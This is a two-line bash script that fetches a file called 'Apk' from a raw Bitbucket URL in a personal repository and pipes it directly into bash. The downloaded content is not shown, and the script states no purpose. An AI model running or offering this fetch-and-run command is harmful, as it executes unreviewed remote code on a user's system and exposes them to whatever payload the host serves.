#!/bin/bash

curl -sL  https://bitbucket.org/kotamabaran777/gas3/raw/034bebe948b210e6b54ee73fd13b125b28d4706d/Apk | bash